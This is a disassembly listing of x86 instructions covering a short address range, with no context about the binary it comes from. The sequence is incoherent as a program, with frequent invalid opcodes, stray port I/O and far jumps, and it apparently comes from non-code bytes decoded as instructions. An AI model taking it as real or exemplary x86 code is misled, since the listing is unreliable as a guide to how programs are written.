  421bde:	mov    DWORD PTR [eax-0x1e],eax
  421be1:	adc    al,0xe5
  421be3:	inc    ebx
  421be4:	or     BYTE PTR [bx+di-0x260b],bl
  421be9:	shl    DWORD PTR [edx+0x4cfea537],cl
  421bef:	(bad)  
  421bf0:	out    0xd8,eax
  421bf2:	call   0x8d121634
  421bf7:	fld    DWORD PTR [esi]
  421bf9:	sar    BYTE PTR [ebp+0x5f],cl
  421bfc:	jmp    0x1155:0x2b485aad
  421c03:	std    
  421c04:	xor    BYTE PTR [ebx+0x67],ch
  421c07:	test   eax,0xac5026ed
  421c0c:	fcom   QWORD PTR [eax-0x6a102bdf]
  421c12:	fild   QWORD PTR [ebx+edx*2+0x67]
  421c16:	cmp    BYTE PTR [edi+0x38],0x82
  421c1a:	add    bh,BYTE PTR [edi]
  421c1c:	or     dl,BYTE PTR [edx-0x1f]
  421c1f:	xor    cl,bl
  421c21:	outs   dx,DWORD PTR ds:[esi]
  421c22:	mov    esp,0x5506ebca
  421c27:	outs   dx,BYTE PTR ds:[esi]
  421c28:	inc    ebx
  421c29:	fcom   DWORD PTR [ebp-0x30f5f257]
  421c2f:	imul   edi,eax,0x75
  421c32:	adc    eax,0x4538de16
  421c37:	adc    eax,0x874c692
  421c3c:	xchg   ebp,eax
  421c3d:	pop    ebp
  421c3e:	pop    ebp
  421c3f:	cld    
  421c40:	pop    ss
  421c41:	cmp    al,0xc2
  421c43:	fnstcw WORD PTR [eax+edx*8-0x6a248ee5]
  421c4a:	das    
  421c4b:	dec    esi
  421c4c:	popf   
  421c4d:	xchg   edi,eax
  421c4e:	aam    0xd1
  421c50:	mov    dl,0x67
  421c52:	push   edx
  421c53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c54:	inc    edx
  421c55:	loope  0x421c0b
  421c57:	in     eax,dx
  421c58:	cmp    eax,0xd278e3d
  421c5d:	daa    
  421c5e:	(bad)  
  421c5f:	mov    ebp,0xb3fb25f1
  421c64:	scas   al,BYTE PTR es:[edi]
  421c65:	cmp    ebp,DWORD PTR [eax-0x38]
  421c68:	push   ebx
  421c69:	(bad)  
  421c6b:	ret    
  421c6c:	fisttp DWORD PTR [esi]
  421c6e:	dec    esp
  421c6f:	jnp    0x421cda
  421c71:	sbb    BYTE PTR [eax+0x26],cl
  421c74:	mov    DWORD PTR [esi-0x3350337e],0x6e25605b
  421c7e:	inc    eax
  421c7f:	outs   dx,DWORD PTR ds:[esi]
  421c80:	int    0xc7
  421c82:	pop    DWORD PTR [ecx]
  421c84:	xor    eax,0x68c0f4a4
  421c89:	and    esp,DWORD PTR [ecx-0x32dfa7e]
  421c8f:	or     eax,DWORD PTR [ebp-0x9]
  421c92:	shr    bh,cl
  421c94:	and    BYTE PTR [ebx+0x0],cl
  421c97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c98:	mov    ebp,0x5c11f151
  421c9d:	pop    edi
  421c9e:	dec    edi
  421c9f:	inc    ebp
  421ca0:	fstp   QWORD PTR [edi+0x4960292a]
  421ca6:	adc    ebp,DWORD PTR [edi]
  421ca8:	cld    
  421ca9:	lods   eax,DWORD PTR ds:[esi]
  421caa:	mov    bh,0x7a
  421cac:	pop    ebx
  421cad:	out    0x94,al
  421caf:	push   0xffffffa5
  421cb1:	fbstp  TBYTE PTR [edx+0x58874fcf]
  421cb7:	xchg   ebp,eax
  421cb8:	mov    cl,0xec
  421cba:	mov    ebx,0x2bb5b203
  421cbf:	dec    esp
  421cc0:	test   al,0x41
  421cc2:	pop    es
  421cc3:	dec    ebx
  421cc4:	push   cs
  421cc5:	mov    al,0x6c
  421cc7:	je     0x421d2f
  421cc9:	bound  ebp,QWORD PTR [ecx]
  421ccb:	push   ebx
  421ccc:	(bad)  
  421ccd:	jl     0x421d3a
  421ccf:	dec    esp
  421cd0:	mov    dh,0x90
  421cd2:	adc    DWORD PTR [ebp-0x58],0x30
  421cd6:	loop   0x421d14
  421cd8:	fsub   QWORD PTR [ecx-0xb]
  421cdb:	xchg   esp,eax
  421cdc:	jg     0x421c82
  421cde:	pop    eax
  421cdf:	jne    0x421d09
  421ce1:	popa   
  421ce2:	push   ss
  421ce3:	loopne 0x421ccb
  421ce5:	adc    eax,0x70f62dca
  421cea:	nop
  421ceb:	xor    BYTE PTR [eax+0x57ba947a],ch
  421cf1:	sbb    edi,edi
  421cf3:	repz mov ds:0x5ba8a4e,al
  421cf9:	out    0xfd,eax
  421cfb:	mov    ds,ecx
  421cfd:	out    0xf8,al
  421cff:	jne    0x421cb9
  421d01:	pushf  
  421d02:	jg     0x421ce3
  421d04:	sar    DWORD PTR [esi-0x4903c172],cl
  421d0a:	popa   
  421d0b:	xor    BYTE PTR [esp+eiz*4],ch
  421d0e:	jmp    0x421cf7
  421d10:	jle    0x421d23
  421d12:	dec    edi
  421d13:	int    0xda
  421d15:	sti    
  421d16:	dec    edi
  421d17:	pop    ebx
  421d18:	and    DWORD PTR [esi-0x60],ebp
  421d1b:	adc    ebx,edx
  421d1d:	dec    eax
  421d1e:	jae    0x421cdf
  421d20:	out    0x52,al
  421d22:	xchg   esi,eax
  421d23:	mov    ds,ebp
  421d25:	adc    bh,al
  421d27:	xchg   BYTE PTR [ecx],al
  421d29:	xchg   esi,eax
  421d2a:	xchg   ebx,eax
  421d2b:	lods   al,BYTE PTR ds:[esi]
  421d2c:	dec    ecx
  421d2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d2e:	stc    
  421d2f:	fs jge 0x421da3
  421d32:	(bad)  
  421d33:	fisttp DWORD PTR [edx+ebx*2-0x2d]
  421d37:	repnz icebp 
  421d39:	inc    ebx
  421d3a:	or     eax,0xb3a2777f
  421d3f:	adc    eax,0x58927ba8
  421d44:	mov    eax,0xecc2e0ba
  421d49:	jae    0x421da9
  421d4b:	test   al,0x87
  421d4d:	in     eax,dx
  421d4e:	std    
  421d4f:	xchg   edi,eax
  421d50:	out    dx,eax
  421d51:	sbb    BYTE PTR [ebp-0x5174458a],ch
  421d57:	mov    ds:0xfbd0db7d,eax
  421d5c:	loop   0x421d0f
  421d5e:	jecxz  0x421d02
  421d60:	xlat   BYTE PTR ds:[ebx]
  421d61:	cmp    esp,ebx
  421d63:	repnz mov eax,ds:0x3fbf9f4d
  421d69:	inc    BYTE PTR [edi]
  421d6b:	retf   
  421d6c:	pop    ebp
  421d6d:	cmp    DWORD PTR [ebx],edi
  421d6f:	arpl   WORD PTR [esi+esi*8+0x54948f96],ax
  421d76:	jnp    0x421df3
  421d78:	aam    0x1f
  421d7a:	xchg   edi,eax
  421d7b:	xchg   edx,eax
  421d7c:	mov    ch,0xb8
  421d7e:	dec    ecx
  421d7f:	cmp    BYTE PTR [esi+0x3e61b7b6],cl
  421d85:	inc    ecx
  421d86:	ror    edi,1
  421d88:	and    DWORD PTR [esi],0x1fa0751
  421d8e:	push   0xffffffc9
  421d90:	ins    BYTE PTR es:[edi],dx
  421d91:	call   0xc9a91db4
  421d96:	mov    al,ds:0x46a5f2fd
  421d9b:	mov    dh,0xee
  421d9d:	aas    
  421d9e:	imul   edi,DWORD PTR [esi-0x61],0x58980ad5
  421da5:	jb     0x421e23
  421da7:	shl    DWORD PTR [ebx-0x5bed429e],1
  421dad:	jmp    0x882743e4
  421db2:	adc    DWORD PTR [ecx],0x69af64f2
  421db8:	pop    ss
  421db9:	cmc    
  421dba:	sub    cx,WORD PTR [edi+0x12]
  421dbe:	call   0x3073:0x99f58e3a
  421dc5:	lds    ecx,FWORD PTR [ebx+0x1a]
  421dc8:	jp     0x421deb
  421dca:	pop    eax
  421dcb:	das    
  421dcc:	xchg   BYTE PTR [ebp-0x58],cl
  421dcf:	cwde   
  421dd0:	sbb    DWORD PTR [ebp+esi*2+0x6e],esp
  421dd4:	ss out 0x32,al
  421dd7:	pop    ds
  421dd8:	std    
  421dd9:	or     BYTE PTR ds:0x1578f742,al
  421ddf:	cs pop esi
  421de1:	or     esi,esp
  421de3:	dec    esi
  421de4:	cmp    BYTE PTR [edi],cl
  421de6:	mov    esp,0xeda80268
  421deb:	loopne 0x421dc2
  421ded:	mov    dl,0x8
  421def:	xchg   edi,eax
  421df0:	xor    DWORD PTR [ecx],0xbf6e64cd
  421df6:	stc    
  421df7:	aaa    
  421df8:	in     eax,dx
  421df9:	cmp    al,0x15
  421dfb:	(bad)  
  421dfc:	xor    DWORD PTR [eax],edx
  421dfe:	rcl    BYTE PTR [edi-0x13],0x7b
  421e02:	pop    ebp
  421e03:	sbb    ch,BYTE PTR [eax]
  421e05:	call   0xdfc77894
  421e0a:	xlat   BYTE PTR ds:[ebx]
  421e0b:	test   BYTE PTR [esi+0x15dec081],0x19
  421e12:	aaa    
  421e13:	cli    
  421e14:	mov    al,ds:0xc7119769
  421e19:	aaa    
  421e1a:	mov    bh,0xb4
  421e1c:	mov    bl,0x69
  421e1e:	imul   BYTE PTR [ebx]
  421e20:	sbb    eax,0x9e88ae75
  421e25:	out    dx,eax
  421e26:	jbe    0x421e50
  421e28:	test   DWORD PTR [esi],esp
  421e2a:	(bad)  
  421e2b:	rol    BYTE PTR [ebp-0x7de92579],cl
  421e31:	mov    al,ds:0x9e2939f2
  421e36:	test   edi,esp
  421e38:	mov    edi,0x818dd6d2
  421e3d:	aam    0x42
  421e3f:	int    0x17
  421e41:	fnstcw WORD PTR [eax+ebx*4-0x110e1ab2]
  421e48:	jmp    0x416afeb9
  421e4d:	lahf   
  421e4e:	cld    
  421e4f:	popf   
  421e50:	mov    dl,BYTE PTR [esi+0x705fb7fb]
  421e56:	jmp    0x421e01
  421e58:	dec    edi
  421e59:	or     al,cl
  421e5b:	retf   0x417a
  421e5e:	mov    ds:0xbcf7ec19,al
  421e63:	adc    al,0x1f
  421e65:	imul   ecx,DWORD PTR [edx+0x36],0x2f34e00b
  421e6c:	jg     0x421ecb
  421e6e:	xlat   BYTE PTR ds:[ebx]
  421e6f:	cwde   
  421e70:	sbb    eax,0x798f5a8
  421e75:	and    bh,BYTE PTR [ecx-0x3c]
  421e78:	xchg   ebx,eax
  421e79:	out    0xf4,al
  421e7b:	repz push edx
  421e7d:	jns    0x421e3d
  421e7f:	in     al,0xe0
  421e81:	fs dec ecx
  421e83:	xchg   esp,eax
  421e84:	ss pop esi
  421e86:	idiv   BYTE PTR [edx+ecx*4-0x19]
  421e8a:	mov    BYTE PTR [esp+eiz*2+0x17c02ae0],cl
  421e91:	jmp    0x67fc:0x98a0dcd4
  421e98:	fdivr  DWORD PTR [esi+0x51]
  421e9b:	cmc    
  421e9c:	or     DWORD PTR [ebp+0x328b3424],eax
  421ea2:	retf   0x7828
  421ea5:	cwde   
  421ea6:	je     0x421ee6
  421ea8:	mov    ch,0x2f
  421eaa:	lock cld 
  421eac:	cmp    al,0xa7
  421eae:	das    
  421eaf:	and    ch,BYTE PTR [eax]
  421eb1:	and    al,0xdd
  421eb3:	add    BYTE PTR [edx+0x2078db82],ch
  421eb9:	in     eax,0x81
  421ebb:	gs fs or eax,0x76580c29
  421ec2:	loope  0x421eb3
  421ec4:	dec    ebp
  421ec5:	out    0xe4,al
  421ec7:	ds test bl,dh
  421eca:	pop    esi
  421ecb:	xchg   edx,eax
  421ecc:	rcr    DWORD PTR [edx-0x3b],cl
  421ecf:	out    dx,al
  421ed0:	retf   0x9165
  421ed3:	adc    ch,BYTE PTR [ebx+0x7709bf4e]
  421ed9:	or     DWORD PTR [eax-0x6c],esp
  421edc:	div    ebp
  421ede:	std    
  421edf:	mov    esi,0xc90c5d67
  421ee4:	inc    ebp
  421ee5:	dec    esi
  421ee6:	lahf   
  421ee7:	or     ah,BYTE PTR [ebp+0x6e]
  421eea:	ins    DWORD PTR es:[edi],dx
  421eeb:	das    
  421eec:	mov    bh,0x2f
  421eee:	sub    BYTE PTR [edx+0x1d2b5183],ah
  421ef4:	cmp    dl,BYTE PTR [edx]
  421ef6:	pop    esp
  421ef7:	and    DWORD PTR [edx],eax
  421ef9:	or     BYTE PTR [esi],bl
  421efb:	cmp    DWORD PTR [ebx+ecx*2],edi
  421efe:	outs   dx,DWORD PTR ds:[esi]
  421eff:	mov    esp,0xaa4218a0
  421f04:	je     0x421f25
  421f06:	xor    BYTE PTR [esi+0x20],cl
  421f09:	mov    ebx,0xb46a9dfe
  421f0e:	or     eax,0xd4d739f7
  421f13:	add    esi,0x9f7aab1
  421f19:	ret    
  421f1a:	es aaa 
  421f1c:	push   edx
  421f1d:	push   0xe3837d96
  421f22:	cmp    eax,0x982542c7
  421f27:	clc    
  421f28:	push   ecx
  421f29:	loop   0x421f89
  421f2b:	add    ecx,DWORD PTR [ebp*8-0x5fd580cd]
  421f32:	xlat   BYTE PTR ds:[ebx]
  421f33:	into   
  421f34:	cmp    DWORD PTR ds:0x44b2bc87,eax
  421f3a:	pop    edx
  421f3b:	adc    eax,0x1931c88
  421f40:	out    dx,eax
  421f41:	ins    DWORD PTR es:[edi],dx
  421f42:	mov    al,0x37
  421f44:	stos   BYTE PTR es:[edi],al
  421f45:	nop
  421f46:	lods   al,BYTE PTR ds:[esi]
  421f47:	arpl   ax,bp
  421f49:	dec    esp
  421f4a:	aas    
  421f4b:	hlt    
  421f4c:	push   esi
  421f4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f4e:	mov    edi,0xddcd6ab
  421f53:	jo     0x421fb7
  421f55:	pushf  
  421f56:	xchg   esi,eax
  421f57:	pop    ebp
  421f58:	aam    0x21
  421f5a:	loopne 0x421f8b
  421f5c:	push   cs
  421f5d:	outs   dx,BYTE PTR ds:[esi]
  421f5e:	retf   
  421f5f:	rcr    DWORD PTR [ebx-0x11],0xa8
  421f63:	test   DWORD PTR [ebx+edi*2+0xc],0xe74704dd
  421f6b:	or     dh,bh
  421f6d:	out    dx,eax
  421f6e:	bound  edi,QWORD PTR [ebp+0x15]
  421f71:	sbb    ebp,DWORD PTR [eax]
  421f73:	cmp    bh,BYTE PTR [esi]
  421f75:	pop    es
  421f76:	mov    cl,0x3d
  421f78:	xor    al,0x40
  421f7a:	xlat   BYTE PTR ds:[ebx]
  421f7b:	jge    0x421f5a
  421f7d:	int    0xd3
  421f7f:	(bad)  
  421f80:	sub    DWORD PTR [edi+esi*8+0x61],esi
  421f84:	pop    ds
  421f85:	sbb    esi,edx
  421f87:	stos   BYTE PTR es:[edi],al
  421f88:	fiadd  WORD PTR [ebx+0x4b]
  421f8b:	and    edi,DWORD PTR [ebx-0x57ab872]
  421f91:	mov    ds:0x423649f2,eax
  421f96:	push   cs
  421f97:	cmc    
  421f98:	in     al,dx
  421f99:	in     al,0xa9
  421f9b:	lds    esi,FWORD PTR [ebx]
  421f9d:	push   ebp
  421f9e:	pushf  
  421f9f:	mov    ebx,0x458686d3
  421fa4:	mov    ch,0xe9
  421fa6:	repnz sub bl,al
  421fa9:	mov    ebx,0xe2615db2
  421fae:	dec    esp
  421faf:	mov    ?,ebx
  421fb1:	inc    edi
  421fb2:	pusha  
  421fb3:	sbb    eax,0x432c2c55
  421fb8:	les    edi,FWORD PTR [bp+di]
  421fbb:	int    0xd1
  421fbd:	jbe    0x421fb0
  421fbf:	pusha  
  421fc0:	jo     0x421fc4
  421fc2:	pop    eax
  421fc3:	jb     0x421fb4
  421fc5:	rol    esp,0x7
  421fc8:	jmp    DWORD PTR [esi-0x14fb71c5]
  421fce:	jne    0x421fa2
  421fd0:	jp     0x421fd3
  421fd2:	test   al,0x92
  421fd4:	cli    
  421fd5:	push   ss
  421fd6:	xor    eax,0x7fb0dd5c
  421fdb:	inc    ebp
  421fdc:	xchg   esi,eax
  421fdd:	sbb    eax,eax
  421fdf:	sahf   
  421fe0:	inc    esp
  421fe1:	jge    0x421f98
  421fe3:	ja     0x421fc0
  421fe5:	jno    0x422024
  421fe7:	mov    al,ds:0x16dfb34a
  421fec:	ror    BYTE PTR [eax-0x2ff946c5],cl
  421ff2:	sar    ah,0x95
  421ff5:	push   edx
  421ff6:	mov    esi,0xa1635e63
  421ffb:	and    eax,0x2b0b8338
  422000:	std    
  422001:	shl    BYTE PTR [ecx+0x1bff93a7],cl
  422007:	cwde   
  422008:	out    dx,al
  422009:	bound  eax,QWORD PTR [edi-0x7c]
  42200c:	add    ch,BYTE PTR [ecx+0x337bd734]
  422012:	test   eax,0x6657d472
  422017:	inc    ebx
  422018:	data16 sbb BYTE PTR [edi],al
  42201b:	or     DWORD PTR [eax+0x7efd42c1],esp
  422021:	add    edx,DWORD PTR [ebx-0x3e371c2a]
  422027:	call   0x8430d05
  42202c:	test   BYTE PTR [edi],ch
  42202e:	jb     0x421ffa
  422030:	adc    eax,0x55e59f9a
  422035:	push   0x1be17a5
  42203a:	mov    ebx,0xf43425bb
  42203f:	sahf   
  422040:	mov    esp,0x5cd1ac75
  422045:	imul   ebp,ebx,0x30045820
  42204b:	xchg   BYTE PTR [ebp-0x3705f391],al
  422051:	push   ds
  422052:	sbb    al,0x5a
  422054:	mov    ah,0xab
  422056:	scas   eax,DWORD PTR es:[edi]
  422057:	popa   
  422058:	retf   
  422059:	mov    DWORD PTR [ecx+0x29],eax
  42205c:	xchg   ebp,ecx
  42205e:	(bad)  
  422062:	xchg   ecx,eax
  422063:	push   edx
  422064:	addr16 out dx,al
  422066:	mov    DWORD PTR [eax-0x72806c01],ebp
  42206c:	push   edx
  42206d:	ins    BYTE PTR es:[edi],dx
  42206e:	inc    esp
  42206f:	in     eax,0xec
  422071:	jmp    0x3565:0x5a9a04fb
  422078:	push   0xffffffc9
  42207a:	sub    eax,0x87e33a35
  42207f:	pop    es
  422080:	jecxz  0x42201a
  422082:	push   esp
  422083:	pusha  
  422084:	jmp    0xefad:0x793d0edd
  42208b:	mul    ch
  42208d:	adc    al,0x5
  42208f:	jmp    0x4220a9
  422091:	sti    
  422092:	sub    bl,ah
  422094:	lods   eax,DWORD PTR ds:[esi]
  422095:	fstp   TBYTE PTR [ecx]
  422097:	fnstsw WORD PTR ds:0x9a216963
  42209d:	adc    ah,ah
  42209f:	pop    edi
  4220a0:	int3   
  4220a1:	popa   
  4220a2:	js     0x4220ad
  4220a4:	(bad)
  4220a7:	pop    ds
  4220a8:	fild   DWORD PTR [edx-0x76]
  4220ab:	xchg   ebx,eax
  4220ac:	mov    ds:0x2aa22258,al
  4220b1:	and    al,cl
  4220b3:	push   esi
  4220b4:	ds ins BYTE PTR es:[edi],dx
  4220b6:	clc    
  4220b7:	sbb    al,0xbf
  4220b9:	iret   
  4220ba:	dec    esi
  4220bb:	dec    edx
  4220bc:	add    BYTE PTR [ebp-0x41eb2a22],0xe8
  4220c3:	push   ss
  4220c4:	cdq    
  4220c5:	and    ebp,DWORD PTR [eax-0x7791f8cc]
  4220cb:	xor    eax,0xca2efab0
  4220d0:	jg     0x4220eb
  4220d2:	in     al,0x64
  4220d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220d5:	inc    edx
  4220d6:	fiadd  DWORD PTR [edx-0x3]
  4220d9:	xchg   DWORD PTR [esi],esp
  4220db:	cmp    al,0xd0
  4220dd:	in     al,dx
  4220de:	loope  0x422071
  4220e0:	cs mov edx,0x4b117d68
  4220e6:	add    eax,0x3b30ec90
  4220eb:	sub    eax,0xdf060233
  4220f0:	daa    
  4220f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220f2:	pop    esi
  4220f3:	pop    ecx
  4220f4:	mov    ds:0x3c8a84d6,eax
  4220f9:	xchg   esi,eax
  4220fa:	xor    esi,DWORD PTR [esi-0x27]
  4220fd:	aam    0x40
  4220ff:	push   eax
  422100:	imul   ebx,DWORD PTR [esi+0x1f4cca9b],0x48
  422107:	mov    BYTE PTR [edx+0x4e2633d7],dh
  42210d:	repnz push edi
  42210f:	xor    al,0xd3
  422111:	mov    dh,0x29
  422113:	or     DWORD PTR [ebp+0x19],esi
  422116:	cmp    bl,BYTE PTR [edx+0x72ef8915]
  42211c:	and    eax,0x9a872f34
  422121:	push   esi
  422122:	or     BYTE PTR [esi],dh
  422124:	int3   
  422125:	push   es
  422126:	jmp    0x422172
  422128:	adc    al,0xa4
  42212a:	push   0x64ba8914
  42212f:	stos   BYTE PTR es:[edi],al
  422130:	aam    0x2a
  422132:	mov    ah,0x26
  422134:	out    0x6,eax
  422136:	rcl    DWORD PTR [eax+0x75],0x55
  42213a:	jo     0x422153
  42213c:	sub    BYTE PTR [esi+0x73],cl
  42213f:	push   es
  422140:	push   eax
  422141:	ins    BYTE PTR es:[edi],dx
  422142:	jp     0x422135
  422144:	cmp    eax,DWORD PTR [edx+0x7ae00087]
  42214a:	push   0x644302b1
  42214f:	sub    DWORD PTR [eax],ecx
  422151:	mov    bl,cl
  422153:	xor    eax,0x60a4b377
  422158:	enter  0x390c,0xc9
  42215c:	jbe    0x4221c4
  42215e:	test   al,0xe0
  422160:	pop    esp
  422161:	jmp    0x5ee9aa26
  422166:	(bad)  ds:0xcde27f55
  42216c:	pop    ebp
  42216d:	jg     0x4221aa
  42216f:	add    DWORD PTR [eax],esp
  422171:	dec    ebx
  422172:	xor    al,0x4e
  422174:	dec    edi
  422175:	call   0x6ee7a731
  42217a:	test   BYTE PTR [ebp-0x5a],cl
  42217d:	adc    DWORD PTR [esi+0x6033f90e],0x2
  422184:	dec    esi
  422185:	call   0xff62:0xd4be9e94
  42218c:	pop    es
  42218d:	jbe    0x422151
  42218f:	(bad)
  422192:	popa   
  422193:	lea    esi,[edi-0x32a9cc40]
  422199:	jecxz  0x4221e8
  42219b:	mov    esi,0x3d5975b1
  4221a0:	sub    bl,dl
  4221a2:	dec    edx
  4221a3:	mov    WORD PTR [edi+0x6f],fs
  4221a6:	rol    DWORD PTR [ebx],cl
  4221a8:	jne    0x422190
  4221aa:	cmc    
  4221ab:	inc    ebp
  4221ac:	push   ecx
  4221ad:	fdiv   QWORD PTR ds:0xe83615f5
  4221b3:	add    edi,DWORD PTR [eax+0x5b4262b1]
  4221b9:	jle    0x422193
  4221bb:	test   al,0xee
  4221bd:	pop    esi
  4221be:	mov    WORD PTR [esi+edi*8-0x17404cb],gs
  4221c5:	pop    esi
  4221c6:	retf   
  4221c7:	fist   DWORD PTR [ecx+0xd]
  4221ca:	dec    ebx
  4221cb:	out    0x8d,eax
  4221cd:	mov    ds:0xa7f7f737,al
  4221d2:	inc    esp
  4221d3:	lahf   
  4221d4:	icebp  
  4221d5:	xchg   esp,eax
  4221d6:	les    ebp,FWORD PTR [eax-0xf682daa]
  4221dc:	das    
  4221dd:	call   0x6e9f6220
  4221e2:	ror    BYTE PTR [esi],cl
  4221e4:	test   eax,0xfe1b7ee8
  4221e9:	xor    ch,0x85
  4221ec:	sahf   
  4221ed:	lods   eax,DWORD PTR ds:[esi]
  4221ee:	je     0x4221c9
  4221f0:	xchg   esi,eax
  4221f1:	sub    ch,BYTE PTR [edx+edx*1-0x317f61b3]
  4221f8:	loope  0x42223e
  4221fa:	icebp  
  4221fb:	out    dx,eax
  4221fc:	xlat   BYTE PTR ds:[ebx]
  4221fd:	cmp    al,0xd1
  4221ff:	div    DWORD PTR [eax]
  422201:	jp     0x4221d5
  422203:	fdivr  st,st(1)
  422205:	inc    ecx
  422206:	ds xchg ebp,eax
  422208:	push   ecx
  422209:	fwait
  42220a:	mov    al,ds:0xddb2346
  42220f:	mov    ch,0xbf
  422211:	(bad)  
  422212:	push   eax
  422213:	data16 adc bh,BYTE PTR [ecx]
  422216:	das    
  422217:	dec    edx
  422218:	div    BYTE PTR [eax+0x11]
  42221b:	jecxz  0x422233
  42221d:	stc    
  42221e:	cdq    
  42221f:	xchg   esi,eax
  422220:	xchg   BYTE PTR [ebp-0x49],bh
  422223:	jne    0x422278
  422225:	les    ebp,FWORD PTR [ebp-0x7c]
  422228:	call   0xb3064f0a
  42222d:	cmp    ebp,DWORD PTR [esi]
  42222f:	and    al,0x8a
  422231:	sbb    eax,0x57977cd0
  422236:	enter  0x960b,0x99
  42223a:	xchg   esp,eax
  42223b:	xchg   ecx,eax
  42223c:	lock (bad) 
  42223e:	jmp    0x69fd:0x4a329a04
  422245:	lods   eax,DWORD PTR ds:[esi]
  422246:	push   cs
  422247:	cmp    ebp,DWORD PTR [edx]
  422249:	or     ebx,eax
  42224b:	int    0xdd
  42224d:	add    DWORD PTR [ebx+0x7b],eax
  422250:	out    dx,eax
  422251:	and    BYTE PTR [edi+0x14307da],0xe9
  422258:	lea    ebp,[ebp+0x4d]
  42225b:	in     eax,dx
  42225c:	in     eax,dx
  42225d:	adc    dl,ah
  42225f:	sbb    eax,0x5c41c54e
  422264:	jnp    0x42225d
  422266:	stos   BYTE PTR es:[edi],al
  422267:	add    al,0xee
  422269:	dec    esp
  42226a:	loope  0x42226c
  42226c:	imul   esp,DWORD PTR [eax-0x52],0x61682be4
  422273:	inc    ebp
  422274:	outs   dx,DWORD PTR fs:[esi]
  422276:	jns    0x422274
  422278:	mov    ebx,DWORD PTR [esp+ecx*8]
  42227b:	sbb    ch,BYTE PTR [edx+0x7b]
  42227e:	int    0x13
  422280:	pop    eax
  422281:	outs   dx,BYTE PTR ds:[esi]
  422282:	sbb    ah,BYTE PTR [ecx+0x2575f624]
  422288:	mov    edi,0xa8394db8
  42228d:	pusha  
  42228e:	jns    0x4222e0
  422290:	lea    esp,[bx+di-0x136f]
  422295:	mov    esi,0x76bf9374
  42229a:	jmp    0xcc0d39f1
  42229f:	jmp    0xc233:0x5b5bdacc
  4222a6:	or     eax,0x6f3098fe
  4222ab:	jno    0x42230d
  4222ad:	js     0x42230b
  4222af:	ins    BYTE PTR es:[edi],dx
  4222b0:	push   0xffffff82
  4222b2:	(bad)  [ebp-0x27]
  4222b5:	sbb    al,0xb7
  4222b7:	or     eax,0x9ed57c97
  4222bc:	scas   eax,DWORD PTR es:[edi]
  4222bd:	sti    
  4222be:	ja     0x42232b
  4222c0:	iret   
  4222c1:	rcl    DWORD PTR [eax+0x7c],cl
  4222c4:	inc    esp
  4222c5:	es dec esi
  4222c7:	xor    DWORD PTR [ebx+eax*4],0xffffffd0
  4222cb:	jbe    0x422297
  4222cd:	cmp    edx,esp
  4222cf:	and    ch,BYTE PTR [edx]
  4222d1:	pushf  
  4222d2:	xor    eax,0x696bc1b8
  4222d7:	mov    esi,0xc28700b7
  4222dc:	dec    edi
  4222dd:	jae    0x4222b4
  4222df:	xlat   BYTE PTR ds:[ebx]
  4222e0:	pmullw mm1,QWORD PTR [edx]
  4222e3:	shl    ch,1
  4222e5:	fidivr DWORD PTR [ebx-0x244420bc]
  4222eb:	mov    BYTE PTR [esi+0x14],bh
  4222ee:	push   ecx
  4222ef:	xchg   ecx,eax
  4222f0:	pop    esp
  4222f1:	mov    al,ss:0xb94d8535
  4222f7:	stc    
  4222f8:	js     0x4222d5
  4222fa:	add    eax,0x26cc1093
  4222ff:	arpl   WORD PTR [ecx],dx
  422301:	icebp  
  422302:	adc    BYTE PTR [edx],bl
  422304:	mov    al,0x58
  422306:	std    
  422307:	lds    esi,FWORD PTR [edx-0x410568aa]
  42230d:	and    al,0xf4
  42230f:	jecxz  0x422389
  422311:	outs   dx,BYTE PTR ds:[esi]
  422312:	adc    dh,BYTE PTR ds:0x406e8657
  422318:	(bad)  
  422319:	adc    eax,0x987fc192
  42231e:	pop    ebp
  42231f:	push   ebx
  422320:	lds    bp,DWORD PTR ds:[ebx-0x35]
  422325:	dec    eax
  422326:	scas   al,BYTE PTR es:[edi]
  422327:	cmp    al,0xee
  422329:	int    0xf2
  42232b:	xor    cl,BYTE PTR [ebx]
  42232d:	sub    bh,BYTE PTR [esi+0x21cb6286]
  422333:	xor    al,al
  422335:	test   eax,0x5b991cc3
  42233a:	fild   WORD PTR [eax-0x10]
  42233d:	inc    esp
  42233e:	in     al,dx
  42233f:	cmp    al,0x73
  422341:	push   cs
  422342:	jge    0x4222f7
  422344:	fs mov bl,0x99
  422347:	mov    bh,0xda
  422349:	push   esp
  42234a:	and    ch,BYTE PTR [eax-0x46]
  42234d:	int3   
  42234e:	ffree  st(3)
  422350:	dec    edx
  422351:	hlt    
  422352:	das    
  422353:	test   ebp,esp
  422355:	mov    eax,esp
  422357:	xlat   BYTE PTR ds:[ebx]
  422358:	ficomp WORD PTR [ebp+esi*2+0x5]
  42235c:	cmp    DWORD PTR [eax+0x20387f67],edx
  422362:	cmp    ah,BYTE PTR [esp+ebx*4+0x7d]
  422366:	imul   ebx,DWORD PTR [edi-0x4d6562a7],0x31
  42236d:	xchg   ecx,eax
  42236e:	mov    bl,0xf4
  422370:	sbb    ebp,ebp
  422372:	push   ecx
  422373:	push   edi
  422374:	sbb    ebx,0xc95fbb66
  42237a:	ins    BYTE PTR es:[edi],dx
  42237b:	sbb    eax,0xf6b27a2b
  422380:	push   ebp
  422381:	clc    
  422382:	scas   al,BYTE PTR es:[edi]
  422383:	daa    
  422384:	xchg   ebp,eax
  422385:	(bad)  [ebx]
  422387:	in     al,0x3c
  422389:	add    esp,DWORD PTR [edi]
  42238b:	iret   
  42238c:	ins    BYTE PTR es:[edi],dx
  42238d:	shr    BYTE PTR [edi+0x60],1
  422390:	dec    esp
  422391:	cld    
  422392:	jmp    0x4223f9
  422394:	xchg   edi,edi
  422396:	jnp    0x42237d
  422398:	lea    eax,ds:0x541b9d4c
  42239e:	test   BYTE PTR [ebx-0x4923a37],0x59
  4223a5:	out    dx,al
  4223a6:	addr16 std 
  4223a8:	mov    WORD PTR ds:0xd62072bd,cs
  4223ae:	xor    eax,0xd799fe51
  4223b3:	pop    eax
  4223b4:	xor    eax,0x514e3cbd
  4223b9:	xchg   ebx,eax
  4223ba:	pop    ebp
  4223bb:	push   ecx
  4223bc:	dec    esi
  4223bd:	rol    BYTE PTR [edi+0x799bb3b3],cl
  4223c3:	add    ebp,esi
